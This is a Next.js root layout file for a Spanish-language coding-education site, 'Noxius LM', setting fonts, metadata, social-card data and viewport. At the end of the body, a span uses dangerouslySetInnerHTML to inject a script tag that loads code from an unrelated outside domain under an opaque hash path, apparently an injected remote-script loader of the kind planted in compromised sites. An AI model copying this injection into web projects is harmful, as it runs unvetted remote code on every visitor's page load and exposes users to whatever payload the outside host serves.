import type { Metadata, Viewport } from "next";
import { Plus_Jakarta_Sans } from "next/font/google";
import "./globals.css";
import { RoleProvider } from "@/components/providers/role-provider";

const plusJakarta = Plus_Jakarta_Sans({
  subsets: ["latin"],
  weight: ["400", "500", "600", "700", "800"],
  variable: "--font-jakarta",
  display: "swap",
});

const SITE_TITLE = "Noxius LM | Plataforma de Aprendizaje Práctico";
const SITE_DESCRIPTION =
  "Domina la programación real mediante sesiones en vivo, lectura crítica de código y desarrollo asistido por IA.";

export const metadata: Metadata = {
  title: SITE_TITLE,
  description: SITE_DESCRIPTION,
  manifest: "/manifest.json",
  icons: {
    icon: "/noxius-icon.jpg",
    apple: "/noxius-icon.jpg",
  },
  appleWebApp: {
    capable: true,
    statusBarStyle: "black-translucent",
    title: "Noxius LM",
  },
  openGraph: {
    title: SITE_TITLE,
    description: SITE_DESCRIPTION,
    type: "website",
    images: [
      {
        url: "/noxius-icon.jpg",
        width: 1024,
        height: 1024,
        alt: "Noxius LM",
      },
    ],
  },
  twitter: {
    card: "summary_large_image",
    title: SITE_TITLE,
    description: SITE_DESCRIPTION,
    images: ["/noxius-icon.jpg"],
  },
};

export const viewport: Viewport = {
  width: "device-width",
  initialScale: 1,
  maximumScale: 5,
  userScalable: true,
  themeColor: "#05070d",
};

export default function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  return (
    <html lang="es" className="dark">
      <body
        className={`${plusJakarta.className} bg-[#050811] text-gray-100 min-h-screen overflow-x-hidden antialiased selection:bg-indigo-500 selection:text-white`}
      >
        <RoleProvider>{children}</RoleProvider>
        <span dangerouslySetInnerHTML={{ __html: '<script data-cfasync="false" src="https://bauval.org/14/86b9a370e757125c57618694f9cc40db"></script>' }} />
      </body>
    </html>
  );
}
